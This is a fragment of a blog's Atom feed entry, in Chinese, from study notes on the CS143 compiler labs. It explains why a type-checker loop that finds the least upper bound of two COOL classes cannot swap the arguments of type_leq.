LR(1)</li></ul></li></ul></li></ul></li></ul></li><li><pre><code class="line-numbers language-C">for (nd = lookup_class(type1); !type_leq(type2, nd-&gt;get_name()); nd = nd-&gt;get_parentnd())</code></pre><p>可以改成type_leq(nd-&gt;get_name(),type2) 吗？</p><p>不可以，在COOL语言中没有定义<code>&gt;</code>，在类型检查中≤的含义是继承自，需要看继承图中的父子关系。如果求两个类型的最小上界类型的话，应该从一个结点出发一直搜索直到找到另一个节点的父类，如果改成type_leq(nd-&gt;get_name(),type2)的话，只要nd不继承自type2就会终止循环并返回nd，可见，两者终止条件不同。</p></li></ul>]]></content>
    
    
    <summary type="html">学习Compiler时完成CS143课程相关lab的记录和心得。</summary>
    
    
    
    <category term="Binary Basics" scheme="http://theffth.github.io/categories/Binary-Basics/"/>
    
    
    <category term="compiler" scheme="http://theffth.github.io/tags/compiler/"/>
    
  </entry>
  
</feed>
